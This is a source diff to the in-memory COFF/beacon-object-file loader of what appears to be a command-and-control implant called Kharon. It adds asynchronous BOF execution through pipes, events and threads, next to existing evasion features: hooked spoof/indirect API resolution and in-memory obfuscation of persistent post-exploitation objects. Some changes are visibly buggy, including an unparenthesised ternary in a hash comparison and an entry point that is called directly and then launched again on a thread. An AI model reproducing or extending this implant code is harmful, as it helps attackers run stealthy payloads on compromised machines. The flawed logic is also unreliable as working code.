@@ -9,7 +9,7 @@ auto Coff::GetCmdID(
 auto Coff::GetTask(
     PVOID Address
 ) -> CHAR* {
-    return Self->Jbs->CurrentUUID;
+    return Self->Jbs->CurrentId;
 }
 
 auto Coff::Add(
@@ -110,7 +110,7 @@ auto Coff::RslApi(
     //
     // check if is Beacon api and resolve this function
     //
-    if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"Beacon" )  || Str::StartsWith( (BYTE*)SymName, (BYTE*)"Ax" ) ) {
+    if ( Str::StartsWith( (PBYTE)SymName, (PBYTE)"Beacon" )  || Str::StartsWith( (PBYTE)SymName, (PBYTE)"Ax" ) ) {
         for ( int i = 0; i < sizeof( ApiTable ) / sizeof( ApiTable[0] ); i++ ) {
             KhDbg("Checking ApiTable[%d] (Hash: 0x%X vs Target: 0x%X)", i, ApiTable[i].Hash, Hsh::Str( SymName ));
             if ( Hsh::Str( SymName ) == ApiTable[i].Hash ) {
@@ -166,7 +166,7 @@ auto Coff::RslApi(
         //
         // if hook bof enabled apply the spoof/indirect
         //        
-        if ( Self->Config.BofProxy ) {
+        if ( Self->Config.Evasion.BofProxy ) {
             for ( INT i = 0; i < 15; i++ ) {
                 if ( Hsh::Str( FncName ) == this->HookTable[i].Hash ) {
                     return (PVOID)this->HookTable[i].Ptr;
@@ -212,6 +212,7 @@ auto Coff::RslApi(
 // Original Loader function now uses Map + Execute + Unmap
 //
 auto Coff::Map(
+    _In_  BOOL         Async,
     _In_  BYTE*        Buffer,
     _In_  ULONG        Size,
     _Out_ COFF_MAPPED* Mapped
@@ -426,7 +427,7 @@ auto Coff::Map(
     for ( INT i = 0; i < SymNbrs; i++ ) {
         if (
             CoffData.Sym[i].Type == COFF_FNC &&
-            CoffData.Sym[i].Hash == Hsh::Str<CHAR>( "go" )
+            CoffData.Sym[i].Hash == Async ? Hsh::Str<CHAR>( "async_go" )   : Hsh::Str<CHAR>( "go" ) 
         ) {
             for ( INT j = 0; j < SecNbrs; j++ ) {
                 if ( Symbols[i].SectionNumber == j + 1 ) {
@@ -533,7 +534,9 @@ auto Coff::Deobfuscate(
 // Executes a previously mapped COFF 
 //
 auto Coff::Execute(
+    _In_ BOOL         Async,
     _In_ COFF_MAPPED* Mapped,
+    _In_ COFF_SHARED* Shared,
     _In_ BYTE*        Args,
     _In_ ULONG        Argc
 ) -> BOOL {
@@ -547,7 +550,7 @@ auto Coff::Execute(
     //
     BOOL WasObfuscated = Mapped->IsObfuscated;
     if ( WasObfuscated ) {
-        if ( !this->Deobfuscate( Mapped ) ) {
+        if ( ! this->Deobfuscate( Mapped ) ) {
             KhDbg("failed to deobfuscate COFF");
             return FALSE;
         }
@@ -561,16 +564,22 @@ auto Coff::Execute(
 
     if ( Obj ) KhDbg("added the object to the list");
 
-    VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( Mapped->EntryPoint );
-    KhDbg("calling 'go' function");
-    Go( Args, Argc );
+    if ( Async ) {
+        VOID ( *AsyncGo )( COFF_SHARED* ) = ( decltype( AsyncGo ) )( Mapped->EntryPoint );
+        AsyncGo( Shared );
+        Obj->Thread = Self->Td->Create( nullptr, Mapped->EntryPoint, Shared, 0, 0, nullptr, nullptr );
+    } else {
+        KhDbg("calling 'go' function");
+        VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( Mapped->EntryPoint );
+        Go( Args, Argc );
+    }
 
     //
     // for persistent COFFs (PostEx), re-obfuscate after execution
     //
     if ( (Action::Task)Self->Jbs->CurrentCmdId == Action::Task::PostEx ) {
         this->Obfuscate( Mapped );
-    } else {
+    } else if ( ! Async ) {
         if ( this->Rm( Obj ) ) KhDbg("removed the object from the list");
     }
 
@@ -640,27 +649,64 @@ auto Coff::FindSymbol(
     return nullptr;
 }
 
+auto PrepareAsync( _Out_ COFF_SHARED* Shared, _In_ PBYTE Args, _In_ ULONG Argc ) -> VOID {
+    G_KHARON
+
+    HANDLE BofReadPipe  = nullptr; 
+    HANDLE BofWritePipe = nullptr;
+    HANDLE BofEventWake = nullptr;
+    
+    if ( ! Self->Krnl32.CreatePipe( &BofReadPipe, &BofWritePipe, nullptr, 0x10000 ) ) {
+        return;
+    }
+
+    BofEventWake = Self->Krnl32.CreateEventA( nullptr, FALSE, FALSE, nullptr );
+    if ( ! BofEventWake ) {
+        return;
+    }
+
+    Shared->PipeRead  = BofReadPipe;
+    Shared->PipeWrite = BofWritePipe;
+    Shared->Event     = BofEventWake;
+    Shared->Id        = Self->Jbs->CurrentId;
+    Shared->Cmd       = Self->Jbs->CurrentCmdId;
+    Shared->Args      = Args;
+    Shared->Argc      = Argc;
+}
+
 //
 // Original Loader function
 //
 auto Coff::Loader(
+    _In_ BOOL  Async,
     _In_ BYTE* Buffer,
     _In_ ULONG Size,
     _In_ BYTE* Args,
     _In_ ULONG Argc
 ) -> BOOL {
     COFF_MAPPED Mapped = { 0 };
+    COFF_SHARED Shared = { 0 };
 
-    if ( !this->Map( Buffer, Size, &Mapped ) ) {
+    //
+    // map coff in memory
+    //
+    if ( ! this->Map( Async, Buffer, Size, &Mapped ) ) {
         return FALSE;
     }
 
-    BOOL Result = this->Execute( &Mapped, Args, Argc );
+    //
+    // prepare shared struct to pass to async bof
+    //
+    if ( Async ) {
+        PrepareAsync( &Shared, Args, Argc );
+    }
+
+    BOOL Result = this->Execute( Async, &Mapped, &Shared, Args, Argc );
 
     //
-    // only unmap if not persistent (PostEx stays mapped + obfuscated)
+    // only unmap if not persistent
     //
-    if ( (Action::Task)Self->Jbs->CurrentCmdId != Action::Task::PostEx ) {
+    if ( (Action::Task)Self->Jbs->CurrentCmdId != Action::Task::PostEx || ! Async ) {
         this->Unmap( &Mapped );
     }
 
